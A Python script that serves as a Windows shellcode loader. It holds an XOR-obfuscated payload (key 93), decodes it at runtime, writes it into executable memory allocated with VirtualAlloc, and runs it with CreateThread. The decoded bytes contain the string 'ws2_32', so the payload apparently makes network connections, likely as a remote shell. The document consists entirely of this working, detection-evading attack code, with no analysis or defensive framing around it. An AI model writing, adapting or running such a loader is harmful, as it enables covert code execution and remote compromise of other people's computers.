import ctypes

encoded_shellcode = b"\x3f\xa1\x15\xde\xb9\xad\xb5\x91\x5d\x5d\x5d\x1c\x0c\x1c\x0d\x0f\x0c\x15\x6c\x8f\x0b\x38\x15\xd6\x0f\x3d\x15\xd6\x0f\x45\x15\xd6\x0f\x7d\x10\x6c\x94\x15\x52\xea\x17\x17\x15\xd6\x2f\x0d\x15\x6c\x9d\xf1\x61\x3c\x21\x5f\x71\x7d\x1c\x9c\x94\x50\x1c\x5c\x9c\xbf\xb0\x0f\x1c\x0c\x15\xd6\x0f\x7d\xd6\x1f\x61\x15\x5c\x8d\x3b\xdc\x25\x45\x56\x5f\x52\xd8\x2f\x5d\x5d\x5d\xd6\xdd\xd5\x5d\x5d\x5d\x15\xd8\x9d\x29\x3a\x15\x5c\x8d\xd6\x15\x45\x19\xd6\x1d\x7d\x0d\x14\x5c\x8d\xbe\x0b\x10\x6c\x94\x15\xa2\x94\x1c\xd6\x69\xd5\x15\x5c\x8b\x15\x6c\x9d\xf1\x1c\x9c\x94\x50\x1c\x5c\x9c\x65\xbd\x28\xac\x11\x5e\x11\x79\x55\x18\x64\x8c\x28\x85\x05\x19\xd6\x1d\x79\x14\x5c\x8d\x3b\x1c\xd6\x51\x15\x19\xd6\x1d\x41\x14\x5c\x8d\x1c\xd6\x59\xd5\x15\x5c\x8d\x1c\x05\x1c\x05\x03\x04\x07\x1c\x05\x1c\x04\x1c\x07\x15\xde\xb1\x7d\x1c\x0f\xa2\xbd\x05\x1c\x04\x07\x15\xd6\x4f\xb4\x16\xa2\xa2\xa2\x00\x14\xe3\x2a\x2e\x6f\x02\x6e\x6f\x5d\x5d\x1c\x0b\x14\xd4\xbb\x15\xdc\xb1\xfd\x5c\x5d\x5d\x14\xd4\xb8\x14\xe1\x5f\x5d\xf0\xdd\x9c\xfc\x9c\x3e\x1c\x09\x14\xd4\xb9\x11\xd4\xac\x1c\xe7\x11\x2a\x7b\x5a\xa2\x88\x11\xd4\xb7\x35\x5c\x5c\x5d\x5d\x04\x1c\xe7\x74\xdd\x36\x5d\xa2\x88\x37\x57\x1c\x03\x0d\x0d\x10\x6c\x94\x10\x6c\x9d\x15\xa2\x9d\x15\xd4\x9f\x15\xa2\x9d\x15\xd4\x9c\x1c\xe7\xb7\x52\x82\xbd\xa2\x88\x15\xd4\x9a\x37\x4d\x1c\x05\x11\xd4\xbf\x15\xd4\xa4\x1c\xe7\xc4\xf8\x29\x3c\xa2\x88\xd8\x9d\x29\x57\x14\xa2\x93\x28\xb8\xb5\xce\x5d\x5d\x5d\x15\xde\xb1\x4d\x15\xd4\xbf\x10\x6c\x94\x37\x59\x1c\x05\x15\xd4\xa4\x1c\xe7\x5f\x84\x95\x02\xa2\x88\xde\xa5\x5d\x23\x08\x15\xde\x99\x7d\x03\xd4\xab\x37\x1d\x1c\x04\x35\x5d\x4d\x5d\x5d\x1c\x05\x15\xd4\xaf\x15\x6c\x94\x1c\xe7\x05\xf9\x0e\xb8\xa2\x88\x15\xd4\x9e\x14\xd4\x9a\x10\x6c\x94\x14\xd4\xad\x15\xd4\x87\x15\xd4\xa4\x1c\xe7\x5f\x84\x95\x02\xa2\x88\xde\xa5\x5d\x20\x75\x05\x1c\x0a\x04\x35\x5d\x1d\x5d\x5d\x1c\x05\x37\x5d\x07\x1c\xe7\x56\x72\x52\x6d\xa2\x88\x0a\x04\x1c\xe7\x28\x33\x10\x3c\xa2\x88\x14\xa2\x93\xb4\x61\xa2\xa2\xa2\x15\x5c\x9e\x15\x74\x9b\x15\xd8\xab\x28\xe9\x1c\xa2\xba\x05\x37\x5d\x04\x14\x9a\x9f\xad\xe8\xff\x0b\xa2\x88"
key = 93

def xor(data, key):
    return bytearray([b ^ key for b in data])

decoded_shellcode = xor(encoded_shellcode, key)

ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(decoded_shellcode), 0x3000, 0x40)
buf = (ctypes.c_char * len(decoded_shellcode)).from_buffer_copy(decoded_shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ptr, buf, len(decoded_shellcode))
ht = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
